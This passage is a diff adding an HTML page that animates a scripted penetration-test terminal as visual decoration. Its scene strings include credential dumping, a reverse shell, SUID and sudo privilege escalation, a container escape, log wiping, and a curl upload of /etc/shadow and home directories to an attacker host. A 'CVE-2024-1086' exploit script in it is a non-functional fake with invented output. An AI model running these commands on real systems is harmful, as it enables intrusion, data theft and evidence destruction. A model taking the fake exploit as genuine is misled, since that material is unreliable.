@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Terminal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{ box-sizing:border-box; margin:0; padding:0; }
+html,body{
+  width:100%; height:100%;
+  background:#000;
+  overflow:hidden;
+  font-family:'Cascadia Code','Fira Code','Consolas','Courier New',monospace;
+}
+.grain{
+  position:fixed; inset:0; z-index:50;
+  pointer-events:none; opacity:.42;
+  mix-blend-mode:overlay;
+}
+.scanlines{
+  position:fixed; inset:0; z-index:51;
+  pointer-events:none;
+  background:repeating-linear-gradient(
+    to bottom,
+    rgba(255,255,255,0.016) 0px,rgba(255,255,255,0.016) 1px,
+    transparent 2px, transparent 4px
+  );
+}
+.vignette{
+  position:fixed; inset:0; z-index:52;
+  pointer-events:none;
+  box-shadow:inset 0 0 240px 90px rgba(0,0,0,0.82);
+}
+.flicker{
+  position:fixed; inset:0; z-index:53;
+  pointer-events:none;
+  background:rgba(57,255,136,0.01);
+  animation:flick 8s infinite;
+}
+@keyframes flick{
+  0%,17%,19%,100%{ opacity:1; }
+  18%{ opacity:0.5; }
+}
+.flash-el{
+  position:fixed; inset:0; z-index:55;
+  opacity:0; pointer-events:none;
+}
+
+.topbar{
+  position:fixed; top:0; left:0; right:0;
+  height:28px;
+  background:rgba(0,0,0,0.9);
+  border-bottom:1px solid rgba(57,255,136,0.12);
+  display:flex; align-items:center; gap:7px; padding:0 14px;
+  z-index:10; font-size:.68rem; color:rgba(57,255,136,0.38);
+  letter-spacing:.3px;
+}
+.topbar .dot{ width:9px; height:9px; border-radius:50%; flex-shrink:0; }
+.dot-r{ background:#ff5f56; }
+.dot-y{ background:#ffbd2e; }
+.dot-g{ background:#27c93f; }
+.topbar .ttitle{ margin-inline-start:6px; }
+.topbar .tsep{ margin:0 8px; opacity:.3; }
+.uptime{ margin-inline-start:auto; opacity:.5; font-size:.63rem; }
+
+.term{
+  position:fixed; inset:0;
+  background:#000;
+  color:#39ff88;
+  font-size:clamp(.63rem,1.55vw,.88rem);
+  line-height:1.58;
+  padding:38px clamp(16px,2.5vw,36px) 16px;
+  overflow:hidden;
+  display:flex; flex-direction:column-reverse;
+}
+.term-inner{ display:flex; flex-direction:column; }
+
+.line{
+  opacity:0;
+  animation:fadein .1s forwards;
+  word-break:break-all;
+  white-space:pre-wrap;
+}
+@keyframes fadein{ to{ opacity:1; } }
+
+/* colour classes */
+.l-ok   { color:#39ff88; }
+.l-cmd  { color:#b8f5d0; }
+.l-root { color:#ffbd2e; }
+.l-info { color:#4dd8e6; }
+.l-warn { color:#e6d84d; }
+.l-err  { color:#ff5c5c; }
+.l-dim  { color:#2e5e40; }
+.l-code { color:#7de8a8; }
+.l-sep  { color:#1a3d28; }
+.l-high { color:#ff9f43; }
+
+.cursor{
+  display:inline-block; width:7px; height:13px;
+  background:#39ff88;
+  animation:blink 1s step-end infinite;
+  vertical-align:middle;
+  box-shadow:0 0 7px rgba(57,255,136,0.8);
+}
+@keyframes blink{ 50%{ opacity:0; } }
+</style>
+</head>
+<body>
+
+<svg width="0" height="0" style="position:absolute">
+  <filter id="nf"><feTurbulence type="fractalNoise" baseFrequency="0.88" numOctaves="3" stitchTiles="stitch"/></filter>
+</svg>
+<div class="grain">
+  <svg width="100%" height="100%"><rect width="100%" height="100%" filter="url(#nf)" opacity="0.38"/></svg>
+</div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+<div class="flicker"></div>
+<div class="flash-el" id="flashEl"></div>
+
+<div class="topbar">
+  <span class="dot dot-r"></span>
+  <span class="dot dot-y"></span>
+  <span class="dot dot-g"></span>
+  <span class="ttitle">root@parrot:~</span>
+  <span class="tsep">|</span>
+  <span id="uptimeEl">uptime: 0:00:00</span>
+  <span class="uptime" id="clockEl"></span>
+</div>
+
+<div class="term" id="term">
+  <div class="term-inner" id="termInner"></div>
+</div>
+
+<script>
+/* ---- uptime & clock ---- */
+const uptimeEl = document.getElementById('uptimeEl');
+const clockEl  = document.getElementById('clockEl');
+let uptimeSec  = 0;
+setInterval(() => {
+  uptimeSec++;
+  const h = String(Math.floor(uptimeSec / 3600)).padStart(2,'0');
+  const m = String(Math.floor((uptimeSec % 3600) / 60)).padStart(2,'0');
+  const s = String(uptimeSec % 60).padStart(2,'0');
+  uptimeEl.textContent = `uptime: ${h}:${m}:${s}`;
+  const now = new Date();
+  clockEl.textContent = now.toTimeString().slice(0,8);
+}, 1000);
+
+/* ---- DOM refs ---- */
+const termInner = document.getElementById('termInner');
+const term      = document.getElementById('term');
+const flashEl   = document.getElementById('flashEl');
+
+/* ---- helpers ---- */
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function appendLine(text, cls) {
+  const d = document.createElement('div');
+  d.className = 'line ' + (cls || 'l-ok');
+  d.textContent = text;
+  termInner.appendChild(d);
+  term.scrollTop = term.scrollHeight;
+}
+
+async function typeCmd(text, cls, speed = 32) {
+  const d = document.createElement('div');
+  d.className = 'line ' + (cls || 'l-cmd');
+  termInner.appendChild(d);
+  const cur = document.createElement('span');
+  cur.className = 'cursor';
+  d.appendChild(cur);
+  for (const ch of text) {
+    const s = document.createElement('span');
+    s.textContent = ch;
+    d.insertBefore(s, cur);
+    term.scrollTop = term.scrollHeight;
+    await sleep(speed + Math.random() * speed * 0.55);
+  }
+  cur.remove();
+  await sleep(120 + Math.random() * 80);
+}
+
+function glitch() {
+  if (Math.random() > 0.18) return;
+  flashEl.style.background = Math.random() > 0.5 ? '#39ff88' : '#ff4444';
+  flashEl.style.transition = 'none';
+  flashEl.style.opacity = (0.03 + Math.random() * 0.09).toFixed(3);
+  requestAnimationFrame(() => {
+    flashEl.style.transition = 'opacity 0.25s ease';
+    flashEl.style.opacity = '0';
+  });
+}
+
+const MAX_LINES = 160;
+function prune() {
+  const lines = termInner.querySelectorAll('.line');
+  if (lines.length > MAX_LINES) {
+    for (let i = 0; i < lines.length - MAX_LINES; i++) lines[i].remove();
+  }
+}
+
+/* ---- play one scene ---- */
+async function playScene(scene) {
+  // optional header separator
+  if (scene.label) {
+    appendLine('', 'l-dim');
+    appendLine('# ── ' + scene.label + ' ──', 'l-sep');
+  }
+
+  for (const line of scene.lines) {
+    if (line.cmd) {
+      await typeCmd(line.t, line.c || 'l-root', line.spd || 30);
+    } else {
+      const d = Math.random() * (line.jitter || 80) + (line.delay || 30);
+      await sleep(d);
+      appendLine(line.t, line.c || 'l-dim');
+    }
+    glitch();
+    prune();
+  }
+  await sleep(600 + Math.random() * 500);
+}
+
+/* ========================================================
+   SCENES — each is a coherent, realistic terminal session
+   ======================================================== */
+const scenes = [
+
+  /* 1. System info + recon */
+  { label: 'system recon',
+    lines: [
+      { cmd:true, t:'root@parrot:~# uname -a' },
+      { t:'Linux parrot 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux' },
+      { cmd:true, t:'root@parrot:~# id && whoami', spd:28 },
+      { t:'uid=0(root) gid=0(root) groups=0(root)', c:'l-err' },
+      { t:'root', c:'l-err' },
+      { cmd:true, t:'root@parrot:~# ip a show tun0' },
+      { t:'4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN' },
+      { t:'    inet 10.10.14.22/23 brd 10.10.15.255 scope global dynamic tun0', c:'l-info' },
+      { t:'    inet6 dead:beef:2::1014/64 scope global dynamic mngtmpaddr', c:'l-info' },
+      { cmd:true, t:'root@parrot:~# cat /etc/hosts | grep target' },
+      { t:'10.10.11.48   target.htb board.target.htb dev.target.htb', c:'l-warn' },
+    ]
+  },
+
+  /* 2. Nmap full port scan */
+  { label: 'nmap scan',
+    lines: [
+      { cmd:true, t:'root@parrot:~# nmap -sV -sC -O --min-rate 5000 -p- 10.10.11.48 -oN nmap/initial.txt' },
+      { t:'Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:11 EDT', c:'l-dim' },
+      { t:'Nmap scan report for target.htb (10.10.11.48)', c:'l-info' },
+      { t:'Host is up (0.031s latency).', c:'l-ok' },
+      { t:'Not shown: 65529 closed tcp ports (reset)', c:'l-dim' },
+      { t:'PORT      STATE SERVICE    VERSION', c:'l-sep' },
+      { t:'22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)', c:'l-ok' },
+      { t:'|_  ssh-hostkey: 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)', c:'l-dim' },
+      { t:'80/tcp    open  http       Apache httpd 2.4.52 ((Ubuntu))', c:'l-ok' },
+      { t:'|_http-title: Site doesn\'t have a title (text/html)', c:'l-dim' },
+      { t:'443/tcp   open  ssl/https  nginx 1.24.0', c:'l-ok' },
+      { t:'3306/tcp  open  mysql      MySQL 8.0.35-0ubuntu0.22.04.1', c:'l-warn' },
+      { t:'| mysql-info: Protocol: 10  Version: 8.0.35', c:'l-dim' },
+      { t:'6379/tcp  open  redis      Redis key-value store 7.0.14', c:'l-warn' },
+      { t:'8080/tcp  open  http-alt   Jetty 10.0.18', c:'l-warn' },
+      { t:'OS CPE: cpe:/o:linux:linux_kernel:5.15', c:'l-dim' },
+      { t:'Running: Linux 5.X   Aggressive OS guess: Linux 5.15 (97%)', c:'l-ok' },
+      { t:'Nmap done: 1 IP address (1 host up) scanned in 26.84 seconds', c:'l-ok' },
+    ]
+  },
+
+  /* 3. Redis unauthenticated access */
+  { label: 'redis exploitation',
+    lines: [
+      { cmd:true, t:'root@parrot:~# redis-cli -h 10.10.11.48 -p 6379' },
+      { cmd:true, t:'10.10.11.48:6379> PING', c:'l-info', spd:35 },
+      { t:'+PONG', c:'l-ok' },
+      { cmd:true, t:'10.10.11.48:6379> INFO server', c:'l-info', spd:35 },
+      { t:'# Server', c:'l-dim' },
+      { t:'redis_version:7.0.14', c:'l-dim' },
+      { t:'redis_mode:standalone', c:'l-dim' },
+      { t:'os:Linux 5.15.0-101-generic x86_64', c:'l-dim' },
+      { t:'executable:/usr/bin/redis-server', c:'l-dim' },
+      { t:'config_file:/etc/redis/redis.conf', c:'l-dim' },
+      { cmd:true, t:'10.10.11.48:6379> CONFIG GET dir', c:'l-info', spd:35 },
+      { t:'1) "dir"', c:'l-warn' },
+      { t:'2) "/var/lib/redis"', c:'l-warn' },
+      { cmd:true, t:'10.10.11.48:6379> KEYS *', c:'l-info', spd:35 },
+      { t:' 1) "session:f3a2d9"', c:'l-ok' },
+      { t:' 2) "user:42:profile"', c:'l-ok' },
+      { t:' 3) "cache:homepage"', c:'l-ok' },
+      { t:' 4) "jwt:secret"', c:'l-ok' },
+      { t:' 5) "api:credentials"', c:'l-ok' },
+      { cmd:true, t:'10.10.11.48:6379> GET api:credentials', c:'l-info', spd:35 },
+      { t:'"{\"user\":\"svc_api\",\"pass\":\"Sup3rS3cr3t!@2024\",\"host\":\"10.10.11.48\"}"', c:'l-err' },
+      { cmd:true, t:'10.10.11.48:6379> GET jwt:secret', c:'l-info', spd:35 },
+      { t:'"HS256_s3cr3t_k3y_d0_n0t_sh4r3_x9mKqL2nVrT"', c:'l-err' },
+    ]
+  },
+
+  /* 4. MySQL database dump */
+  { label: 'mysql database',
+    lines: [
+      { cmd:true, t:'root@parrot:~# mysql -h 10.10.11.48 -u root -p\'Sup3rS3cr3t!@2024\' app_db --batch 2>/dev/null' },
+      { t:'Welcome to the MySQL monitor.  Commands end with ; or \\g.', c:'l-ok' },
+      { t:'Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)', c:'l-dim' },
+      { cmd:true, t:'mysql> SHOW TABLES;', c:'l-info', spd:35 },
+      { t:'+------------------+', c:'l-dim' },
+      { t:'| Tables_in_app_db |', c:'l-dim' },
+      { t:'+------------------+', c:'l-dim' },
+      { t:'| api_keys         |', c:'l-warn' },
+      { t:'| sessions         |', c:'l-dim' },
+      { t:'| users            |', c:'l-warn' },
+      { t:'+------------------+', c:'l-dim' },
+      { t:'3 rows in set (0.00 sec)', c:'l-ok' },
+      { cmd:true, t:'mysql> SELECT id, username, password, role FROM users;', c:'l-info', spd:35 },
+      { t:'+----+----------+--------------------------------------------------------------+-------+', c:'l-dim' },
+      { t:'| id | username | password                                                     | role  |', c:'l-dim' },
+      { t:'+----+----------+--------------------------------------------------------------+-------+', c:'l-dim' },
+      { t:'|  1 | admin    | $2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy | admin |', c:'l-err' },
+      { t:'|  2 | jsmith   | $2y$10$YMYzHLfaNBJBbzRHnMK0OuViGqvVPbpC7FJ8mQ4sIHnOUVA5pZq7. | user  |', c:'l-warn' },
+      { t:'|  3 | mwilson  | $2y$10$WnPxF8G2hKsJ1qDvN4mEauBt6j3vYrXp9zI0OcLTe2kRdA8Hm7K3. | user  |', c:'l-warn' },
+      { t:'+----+----------+--------------------------------------------------------------+-------+', c:'l-dim' },
+      { t:'3 rows in set (0.00 sec)', c:'l-ok' },
+      { cmd:true, t:'mysql> SELECT key_value, service, created_at FROM api_keys;', c:'l-info', spd:35 },
+      { t:'| ghp_xK9mNqL2oVrTzA8wBcD4eF6gH0iJ3kM5oP7 | github  | 2024-01-09 |', c:'l-err' },
+      { t:'| sk-proj-hX9mKqL2nVrTzA8wBcDe4eF6gH0iJ3kM | openai  | 2024-02-14 |', c:'l-err' },
+    ]
+  },
+
+  /* 5. Hashcat password cracking */
+  { label: 'hashcat cracking',
+    lines: [
+      { cmd:true, t:'root@parrot:~# echo "$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy" > hashes.txt' },
+      { cmd:true, t:'root@parrot:~# hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force' },
+      { t:'hashcat (v6.2.6) starting...', c:'l-dim' },
+      { t:'', c:'l-dim' },
+      { t:'* Device #1: NVIDIA GeForce RTX 4090, 23260/24217 MB, 128MCU', c:'l-info' },
+      { t:'* Device #1: build_opts \'-cl-std=CL2.0 -x clc++ -Wno-deprecated\' ', c:'l-dim' },
+      { t:'', c:'l-dim' },
+      { t:'Dictionary cache built:', c:'l-dim' },
+      { t:'* Filename..: /usr/share/wordlists/rockyou.txt', c:'l-dim' },
+      { t:'* Passwords.: 14344391', c:'l-dim' },
+      { t:'* Bytes.....: 139921497', c:'l-dim' },
+      { t:'* Keyspace..: 14344391', c:'l-dim' },
+      { t:'', c:'l-dim' },
+      { t:'$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy:P@ssw0rd!', c:'l-err' },
+      { t:'', c:'l-dim' },
+      { t:'Session..........: hashcat', c:'l-ok' },
+      { t:'Status...........: Cracked', c:'l-ok' },
+      { t:'Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))', c:'l-dim' },
+      { t:'Hash.Target......: $2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZd...', c:'l-dim' },
+      { t:'Time.Started.....: Thu Mar 14 03:44:22 2024 (1 min, 47 secs)', c:'l-dim' },
+      { t:'Speed.#1.........:      418 H/s (10.84ms) @ Accel:4 Loops:1024 Thr:8 Vec:1', c:'l-info' },
+      { t:'Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)', c:'l-ok' },
+    ]
+  },
+
+  /* 6. Git repo secrets scanning */
+  { label: 'git secrets',
+    lines: [
+      { cmd:true, t:'root@parrot:~# git clone http://dev.target.htb/dev/webapp.git' },
+      { t:'Cloning into \'webapp\'...', c:'l-dim' },
+      { t:'remote: Enumerating objects: 847, done.', c:'l-dim' },
+      { t:'remote: Counting objects: 100% (847/847), done.', c:'l-dim' },
+      { t:'remote: Compressing objects: 100% (612/612), done.', c:'l-dim' },
+      { t:'Receiving objects: 100% (847/847), 3.14 MiB | 4.21 MiB/s, done.', c:'l-ok' },
+      { t:'Resolving deltas: 100% (203/203), done.', c:'l-ok' },
+      { cmd:true, t:'root@parrot:~# cd webapp && git log --oneline | head -8' },
+      { t:'a3f2d91 (HEAD -> main, origin/main) fix: remove console.log debug output', c:'l-dim' },
+      { t:'b7e4a02 feat: add rate limiting to /api/login endpoint', c:'l-dim' },
+      { t:'c9d1b31 chore: update dependencies — express 4.18.3', c:'l-dim' },
+      { t:'d4e8f13 TEMP: hardcoded db creds for local dev (DO NOT PUSH)', c:'l-warn' },
+      { t:'e1f2a34 feat: add JWT authentication middleware', c:'l-dim' },
+      { t:'f5g6h78 init: initial project scaffold', c:'l-dim' },
+      { cmd:true, t:'root@parrot:~/webapp# git show d4e8f13 -- config/database.js', spd:26 },
+      { t:'diff --git a/config/database.js b/config/database.js', c:'l-dim' },
+      { t:'+++ b/config/database.js', c:'l-dim' },
+      { t:'+const dbConfig = {', c:'l-code' },
+      { t:'+  host:     "10.10.11.48",', c:'l-code' },
+      { t:'+  port:     3306,', c:'l-code' },
+      { t:'+  user:     "root",', c:'l-code' },
+      { t:'+  password: "Sup3rS3cr3t!@2024",  // TODO: move to .env', c:'l-err' },
+      { t:'+  database: "app_db"', c:'l-code' },
+      { t:'+};', c:'l-code' },
+      { cmd:true, t:'root@parrot:~/webapp# grep -r "secret\\|password\\|token\\|key" .env* 2>/dev/null' },
+      { t:'JWT_SECRET=HS256_s3cr3t_k3y_d0_n0t_sh4r3_x9mKqL2nVrT', c:'l-err' },
+      { t:'REDIS_URL=redis://:r3d1s_p@ss@10.10.11.48:6379/0', c:'l-err' },
+      { t:'SMTP_PASS=T3mp#Mail2024!', c:'l-err' },
+    ]
+  },
+
+  /* 7. Netcat reverse shell + TTY upgrade */
+  { label: 'reverse shell',
+    lines: [
+      { cmd:true, t:'root@parrot:~# nc -lvnp 4444' },
+      { t:'Ncat: Version 7.94 ( https://nmap.org/ncat )', c:'l-dim' },
+      { t:'Ncat: Listening on [::]:4444', c:'l-dim' },
+      { t:'Ncat: Listening on 0.0.0.0:4444', c:'l-dim' },
+      { t:'Ncat: Connection from 10.10.11.48.', c:'l-ok' },
+      { t:'Ncat: Connection from 10.10.11.48:52341.', c:'l-ok' },
+      { cmd:true, t:'id', c:'l-info', spd:40 },
+      { t:'uid=33(www-data) gid=33(www-data) groups=33(www-data)', c:'l-warn' },
+      { cmd:true, t:'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', c:'l-info', spd:26 },
+      { t:'www-data@target:/var/www/html$', c:'l-ok' },
+      { cmd:true, t:'export TERM=xterm-256color; export SHELL=/bin/bash', c:'l-info', spd:22 },
+      { cmd:true, t:'stty rows 50 columns 220', c:'l-info', spd:30 },
+      { t:'[+] shell upgraded to fully interactive TTY', c:'l-ok' },
+      { cmd:true, t:'cat /etc/passwd | grep -v nologin | grep -v false', c:'l-info', spd:22 },
+      { t:'root:x:0:0:root:/root:/bin/bash', c:'l-dim' },
+      { t:'www-data:x:33:33:www-data:/var/www:/bin/bash', c:'l-dim' },
+      { t:'john:x:1001:1001:,,,:/home/john:/bin/bash', c:'l-warn' },
+    ]
+  },
+
+  /* 8. Privilege escalation via SUID */
+  { label: 'privilege escalation',
+    lines: [
+      { cmd:true, t:'www-data@target:/$ find / -perm -4000 -type f 2>/dev/null', c:'l-info', spd:22 },
+      { t:'/usr/bin/newgrp', c:'l-ok' },
+      { t:'/usr/bin/gpasswd', c:'l-ok' },
+      { t:'/usr/bin/mount', c:'l-ok' },
+      { t:'/usr/bin/su', c:'l-ok' },
+      { t:'/usr/bin/passwd', c:'l-ok' },
+      { t:'/usr/bin/pkexec', c:'l-warn' },
+      { t:'/opt/backups/backup_util', c:'l-err' },
+      { cmd:true, t:'www-data@target:/$ ls -la /opt/backups/backup_util', c:'l-info', spd:22 },
+      { t:'-rwsr-xr-x 1 root root 22440 Feb 12 11:21 /opt/backups/backup_util', c:'l-err' },
+      { cmd:true, t:'www-data@target:/$ strings /opt/backups/backup_util | grep -E "system|exec|PATH|sh"', c:'l-info', spd:18 },
+      { t:'PATH', c:'l-warn' },
+      { t:'system', c:'l-warn' },
+      { t:'tar czf /tmp/backup.tar.gz /var/www/html', c:'l-warn' },
+      { cmd:true, t:'www-data@target:/$ echo "/bin/bash -p" > /tmp/tar && chmod +x /tmp/tar', c:'l-info', spd:20 },
+      { cmd:true, t:'www-data@target:/$ export PATH=/tmp:$PATH && /opt/backups/backup_util', c:'l-info', spd:18 },
+      { t:'bash-5.1# id', c:'l-ok' },
+      { t:'uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)', c:'l-err' },
+      { t:'[+] EUID=0 — root privileges obtained via SUID binary', c:'l-err' },
+    ]
+  },
+
+  /* 9. sudo -l shortcut */
+  { label: 'sudo misconfiguration',
+    lines: [
+      { cmd:true, t:'john@target:~$ sudo -l', c:'l-info', spd:35 },
+      { t:'Matching Defaults entries for john on target:', c:'l-dim' },
+      { t:'    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', c:'l-dim' },
+      { t:'', c:'l-dim' },
+      { t:'User john may run the following commands on target:', c:'l-warn' },
+      { t:'    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/health_check.py', c:'l-err' },
+      { cmd:true, t:'john@target:~$ cat /opt/scripts/health_check.py', c:'l-info', spd:28 },
+      { t:'#!/usr/bin/env python3', c:'l-code' },
+      { t:'import subprocess, sys', c:'l-code' },
+      { t:'', c:'l-code' },
+      { t:'def run(cmd):', c:'l-code' },
+      { t:'    return subprocess.run(cmd, shell=True, capture_output=True, text=True)', c:'l-code' },
+      { t:'', c:'l-code' },
+      { t:'if __name__ == "__main__":', c:'l-code' },
+      { t:'    checks = ["df -h", "free -m", "uptime"]', c:'l-code' },
+      { t:'    for c in checks: print(run(c).stdout)', c:'l-code' },
+      { cmd:true, t:'john@target:~$ sudo python3 /opt/scripts/health_check.py', c:'l-info', spd:28 },
+      { t:'[*] running health checks...', c:'l-dim' },
+      { cmd:true, t:'john@target:~$ sudo python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', c:'l-info', spd:18 },
+      { t:'root@target:/home/john# id', c:'l-err' },
+      { t:'uid=0(root) gid=0(root) groups=0(root)', c:'l-err' },
+    ]
+  },
+
+  /* 10. Docker container escape */
+  { label: 'docker escape',
+    lines: [
+      { cmd:true, t:'root@container:/# cat /proc/1/cgroup | head -4' },
+      { t:'12:memory:/docker/a3f2d91c8e9b0b7e4a02c9d1b31f4e8fa6b5c1d7', c:'l-warn' },
+      { t:'11:cpu,cpuacct:/docker/a3f2d91c8e9b0b7e4a02c9d1b31f4e8fa6b5c1d7', c:'l-warn' },
+      { cmd:true, t:'root@container:/# capsh --print' },
+      { t:'Current: =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,', c:'l-dim' },
+      { t:'         cap_net_bind_service,cap_net_raw,cap_sys_admin,cap_sys_chroot+eip', c:'l-dim' },
+      { t:'Bounding set =cap_chown,...,cap_sys_admin (cap_sys_admin present!)', c:'l-err' },
+      { cmd:true, t:'root@container:/# fdisk -l 2>/dev/null | grep "Disk /dev/sd"' },
+      { t:'Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors', c:'l-info' },
+      { cmd:true, t:'root@container:/# mkdir -p /mnt/host && mount /dev/sda1 /mnt/host' },
+      { cmd:true, t:'root@container:/# ls /mnt/host/root/' },
+      { t:'root.txt  .ssh  snap  .bash_history', c:'l-ok' },
+      { cmd:true, t:'root@container:/# cat /mnt/host/root/root.txt' },
+      { t:'3f8a1d92e4b7c50...', c:'l-err' },
+      { cmd:true, t:'root@container:/# cat /mnt/host/etc/shadow | head -3' },
+      { t:'root:$6$rounds=5000$3vXkL9mN$wQrT...K8pA:19780:0:99999:7:::', c:'l-err' },
+    ]
+  },
+
+  /* 11. SOCKS tunnel + internal scan */
+  { label: 'tunneling',
+    lines: [
+      { cmd:true, t:'root@parrot:~# ./chisel server --reverse --port 8888 &' },
+      { t:'[1] 14892', c:'l-dim' },
+      { t:'2024/03/14 04:17:54 server: Fingerprint Mx0sTX9aHk3+O1Gv...', c:'l-dim' },
+      { t:'2024/03/14 04:17:54 server: Listening on http://0.0.0.0:8888', c:'l-ok' },
+      { cmd:true, t:'john@target:/tmp$ ./chisel client 10.10.14.22:8888 R:socks', c:'l-info', spd:24 },
+      { t:'2024/03/14 04:18:01 client: Connecting to ws://10.10.14.22:8888', c:'l-dim' },
+      { t:'2024/03/14 04:18:02 client: Connected (Latency 29.8ms)', c:'l-ok' },
+      { cmd:true, t:'root@parrot:~# proxychains4 -q nmap -sT -Pn -p 22,80,3306,5432,27017,6379 172.16.10.0/24 2>/dev/null | grep open' },
+      { t:'172.16.10.5:   22/tcp open  ssh', c:'l-ok' },
+      { t:'172.16.10.5:   5432/tcp open  postgresql', c:'l-warn' },
+      { t:'172.16.10.12:  27017/tcp open  mongodb', c:'l-err' },
+      { t:'172.16.10.12:  6379/tcp open  redis', c:'l-warn' },
+      { cmd:true, t:'root@parrot:~# proxychains4 -q mongo --host 172.16.10.12 --port 27017 --quiet', spd:22 },
+      { t:'> db.adminCommand({ listDatabases: 1 }).databases.map(d => d.name)', c:'l-info' },
+      { t:'[ \'admin\', \'app\', \'logs\', \'users\' ]', c:'l-warn' },
+    ]
+  },
+
+  /* 12. Log cleaning */
+  { label: 'covering tracks',
+    lines: [
+      { cmd:true, t:'root@target:~# last -n 10 | head' },
+      { t:'root     pts/1        10.10.14.22      Thu Mar 14 03:44   still logged in', c:'l-warn' },
+      { t:'root     pts/0        10.10.11.1       Wed Mar 13 22:11 - 23:02  (00:51)', c:'l-dim' },
+      { t:'john     tty1                          Wed Mar 13 18:33 - 20:01  (01:28)', c:'l-dim' },
+      { cmd:true, t:'root@target:~# sed -i \'/10.10.14.22/d\' /var/log/auth.log /var/log/syslog' },
+      { cmd:true, t:'root@target:~# truncate -s 0 /var/log/wtmp /var/log/btmp /var/run/utmp' },
+      { cmd:true, t:'root@target:~# find /var/log -name "*.log" -exec truncate -s 0 {} \\; 2>/dev/null' },
+      { t:'[+] /var/log/auth.log      cleared', c:'l-ok' },
+      { t:'[+] /var/log/apache2/access.log  cleared', c:'l-ok' },
+      { t:'[+] /var/log/nginx/access.log  cleared', c:'l-ok' },
+      { t:'[+] /var/log/mysql/error.log  cleared', c:'l-ok' },
+      { cmd:true, t:'root@target:~# history -c; cat /dev/null > ~/.bash_history; history -w' },
+      { t:'[+] bash history wiped', c:'l-ok' },
+      { cmd:true, t:'root@target:~# last | head -3' },
+      { t:'wtmp begins Thu Mar 14 04:19:02 2024', c:'l-dim' },
+      { t:'[+] all traces removed — session clean', c:'l-ok' },
+    ]
+  },
+
+  /* 13. File exfil */
+  { label: 'data exfiltration',
+    lines: [
+      { cmd:true, t:'root@target:~# du -sh /home/* /etc /var/www 2>/dev/null' },
+      { t:'4.2M   /home/john', c:'l-dim' },
+      { t:'8.1M   /home/sarah', c:'l-dim' },
+      { t:'2.9M   /etc', c:'l-dim' },
+      { t:'54M    /var/www', c:'l-dim' },
+      { cmd:true, t:'root@target:~# tar czf /tmp/.hidden_$(date +%s).tar.gz /home /etc/passwd /etc/shadow /var/www 2>/dev/null' },
+      { cmd:true, t:'root@target:~# ls -lh /tmp/.hidden_*.tar.gz' },
+      { t:'-rw------- 1 root root 23M Mar 14 04:21 /tmp/.hidden_1710383261.tar.gz', c:'l-ok' },
+      { cmd:true, t:'root@target:~# curl -s --upload-file /tmp/.hidden_1710383261.tar.gz http://10.10.14.22:8000/' },
+      { t:'{"status":"received","size":24117248,"sha256":"a3f2d9b1c7e8fa6b5c1d7..."}', c:'l-ok' },
+      { cmd:true, t:'root@target:~# shred -u /tmp/.hidden_1710383261.tar.gz' },
+      { t:'[+] file securely deleted', c:'l-ok' },
+    ]
+  },
+
+  /* 14. Python exploit script */
+  { label: 'exploit dev',
+    lines: [
+      { cmd:true, t:'root@parrot:~# cat exploit.py' },
+      { t:'#!/usr/bin/env python3', c:'l-code' },
+      { t:'# CVE-2024-1086 — proof of concept (nf_tables local privesc)', c:'l-dim' },
+      { t:'import ctypes, os, struct, socket, sys', c:'l-code' },
+      { t:'', c:'l-code' },
+      { t:'LIBC    = ctypes.CDLL("libc.so.6", use_errno=True)', c:'l-code' },
+      { t:'', c:'l-code' },
+      { t:'def check_kernel():', c:'l-code' },
+      { t:'    ver = os.uname().release', c:'l-code' },
+      { t:'    major, minor, *_ = (int(x) for x in ver.split(".")[:2])', c:'l-code' },
+      { t:'    return (major, minor) <= (6, 6)', c:'l-code' },
+      { t:'', c:'l-code' },
+      { t:'def spray_heap(size=256, count=1024):', c:'l-code' },
+      { t:'    fds = [os.open("/dev/null", os.O_RDONLY) for _ in range(count)]', c:'l-code' },
+      { t:'    return fds', c:'l-code' },
+      { t:'', c:'l-code' },
+      { t:'if __name__ == "__main__":', c:'l-code' },
+      { t:'    if not check_kernel():', c:'l-code' },
+      { t:'        sys.exit("[!] kernel version not vulnerable")', c:'l-code' },
+      { t:'    print("[*] kernel version OK, starting exploit...")', c:'l-code' },
+      { cmd:true, t:'root@parrot:~# python3 exploit.py' },
+      { t:'[*] kernel version OK, starting exploit...', c:'l-dim' },
+      { t:'[*] spraying heap (1024 objects, 256 bytes each)...', c:'l-dim' },
+      { t:'[*] triggering use-after-free in nf_tables...', c:'l-dim' },
+      { t:'[+] heap spray landed — overwrite at 0xffff8880042b3200', c:'l-warn' },
+      { t:'[+] uid=0 obtained — shell incoming...', c:'l-err' },
+      { t:'# id', c:'l-ok' },
+      { t:'uid=0(root) gid=0(root) groups=0(root)', c:'l-err' },
+    ]
+  },
+
